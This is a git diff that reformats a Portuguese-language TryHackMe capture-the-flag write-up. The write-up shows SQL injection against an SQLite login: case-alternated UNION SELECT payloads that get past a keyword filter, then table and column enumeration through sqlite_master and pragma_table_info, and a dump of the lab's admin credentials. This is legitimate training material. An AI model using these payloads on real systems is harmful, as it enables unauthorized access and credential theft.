@@ -16,22 +16,21 @@ A primeira ideia foi tentar conectar via SSH com essas credenciais, mas não foi
 
 Como o enunciado sugere que é um sistema de banco de dados, a segunda aproximação envolveu verificar se o sistema é vulnerável a ataques de SQL Injection.
 
-Utilizando alguns dos payloads encontrados no repo https://github.com/payloadbox/sql-injection-payload-list, e baseado nas mensagens de erro, foi possível identificar que o engine usado no banco de dados era o SQLite
+Utilizando alguns dos payloads encontrados no [repositório do payloadbox](https://github.com/payloadbox/sql-injection-payload-list), e baseado nas mensagens de erro, foi possível identificar que o engine usado no banco de dados era o SQLite
 
 Testando o payload ' UNION SELECT 1+1' foi exibida uma mensagem indicando que existem filtros para algumas expressões e caracteres.
 
 Felizmente as expressões do SQLite não são case-sensitive, então ao tentar alternar os caracteres entre maiúsculos e minúsculos, conseguimos bypassar o filtro e executar as operações normalmente.
 
-' UnIoN SeLeCt 1+1 '
+`' UnIoN SeLeCt 1+1 '`
 
 retornou o resultado: 2, indicando que o código estava sendo de fato executado pelo banco de dados.
 
 ![image](https://github.com/user-attachments/assets/67bc00e4-32bb-415c-8ba9-029551c7bca5)
 
-A partir daí, o foco é em enumerar as informações das tabelas. Para isso, vamos prosseguir com o método de ataque utilizando as expressões UNION 
-https://portswigger.net/web-security/sql-injection/union-attacks
+A partir daí, o foco é em enumerar as informações das tabelas. Para isso, vamos prosseguir com o método de ataque utilizando as expressões UNION [Referência PortSwigger](https://portswigger.net/web-security/sql-injection/union-attacks)
 
-Conforme a documentação do SQLite, disponível em https://www.sqlite.org/schematab.html Em todos os bancos de dados que utilizam essa engine, vai existir uma tabela que contém algumas 
+Conforme a [documentação](https://www.sqlite.org/schematab.html) do SQLite, em todos os bancos de dados que utilizam essa engine, vai existir uma tabela que contém algumas 
 informações sobre todas as outras tabelas.
 
 CREATE TABLE sqlite_schema(
@@ -40,7 +39,7 @@ CREATE TABLE sqlite_schema(
   tbl_name text,
   rootpage integer,
   sql text
-);
+);`
 
 Podendo receber esses nomes alternativos: 
     sqlite_master
@@ -49,31 +48,31 @@ Podendo receber esses nomes alternativos:
 
 
 Seguindo nosso procedimento para conseguir as informações, podemos utilizar o payload
-' UNiON SeLect name FROM sqlite_master '
+`' UNiON SeLect name FROM sqlite_master '`
 
 ![image](https://github.com/user-attachments/assets/9c8fe118-20d6-4ed5-8098-9e788bfa805e)
 
 Descobrimos a tabela admintable
 
 Agora podemos fazer o mesmo processo dentro dessa tabela.
-Para descobrir o nome das colunas, podemos realizar a consulta à estrutura pragma_table, conforme exemplificado nesse post do fórum do SQLite https://sqlite.org/forum/info/9add3c3898aed7c4
+Para descobrir o nome das colunas, podemos realizar a consulta à estrutura pragma_table, conforme exemplificado nesse [post do fórum do SQLite](https://sqlite.org/forum/info/9add3c3898aed7c4)
 
-' UnIoN SeLect name from pragma_table_info('admintable') '
+`' UnIoN SeLect name from pragma_table_info('admintable') '`
 Primeira coluna: id
 
-' UnIoN SeLect name from pragma_table_info('admintable') where name != 'id
+`' UnIoN SeLect name from pragma_table_info('admintable') where name != 'id`
 Segunda coluna: password
 
-' UnIon SeLect name from pragma_table_info('admintable') where name != 'id' and name != 'password
+`' UnIon SeLect name from pragma_table_info('admintable') where name != 'id' and name != 'password`
 Terceira coluna: username
 
 ![image](https://github.com/user-attachments/assets/9fa1dbb6-63de-4cde-b674-569dbb22317e)
 
 # Verificando os usernames
-' UnIon SeLect username from admintable ' 
+`' UnIon SeLect username from admintable ' `
 *TryHackMeAdmin*
 
-' UnIoN SeLeCt password from admintable where username = 'TryHackMeAdmin
+`' UnIoN SeLeCt password from admintable where username = 'TryHackMeAdmin`
 *mamZtAuMlrsEy5bp6q17*
 
 ![image](https://github.com/user-attachments/assets/5a91292a-f4e1-4713-94af-d967347c56c2)
@@ -83,10 +82,10 @@ Vamos tentar realizar o acesso via SSH com essas credenciais, mas novamente, nã
 ![image](https://github.com/user-attachments/assets/285923c5-f07a-46aa-bc91-a6c8b9176c98)
 
 Realizando uma nova consulta ao banco de usuários 
-' UnIon SeLect username from admintable where username != 'TryHackMeAdmin
+`' UnIon SeLect username from admintable where username != 'TryHackMeAdmin`
 
 Olha ela aí!, encontramos o usuário *flag* agora vamos ver se a flag está na senha 
-' UnIoN SeLeCt password from admintable where username = 'flag
+`' UnIoN SeLeCt password from admintable where username = 'flag`
 
 ![image](https://github.com/user-attachments/assets/cabcb408-fc4e-4a13-9cfa-4622a0c4a644)
 
